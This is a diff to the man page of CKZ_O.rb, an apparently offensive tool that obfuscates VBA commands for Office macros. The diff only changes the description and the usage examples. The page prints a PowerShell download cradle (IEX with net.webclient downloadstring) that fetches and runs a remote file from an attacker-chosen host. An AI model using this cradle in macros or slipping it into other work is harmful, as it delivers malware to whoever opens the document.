@@ -10,18 +10,18 @@ CKZ_O.rb
       Created by CausticKirbyZ
       
 .SH DESCRIPTION
-Obfuscates a vba cmd for office macros by splitting it 
-by chars and then combining it back together and running it in a shell
+Obfuscates a vba cmd for office macros by converting characters to ascii
+and then stitching it back together and running it in a shell
 
 .SH VBA CMD
 powershell.exe \"IEX ((new-object net.webclient).downloadstring('#{protocol}://#{ipadd}/#{filename}')) 
 
 .SH SYNOPSIS
-CKZ_O.rb <protocol> <ip address[:portnumber]> <file name>
+CKZ_O <protocol> <ip address[:portnumber]> <file name>
 
 .SH EXAMPLE
-./CKZ_O.rb http 192.168.1.1 myfile.txt
-./CKZ_O.rb https 192.168.1.1:1234 myfile.txt
+CKZ_O http 192.168.1.1 myfile.txt
+CKZ_O https 192.168.1.1:1234 myfile.txt
 
 .SH GITHUB 
 For all other bugs/requests post to:
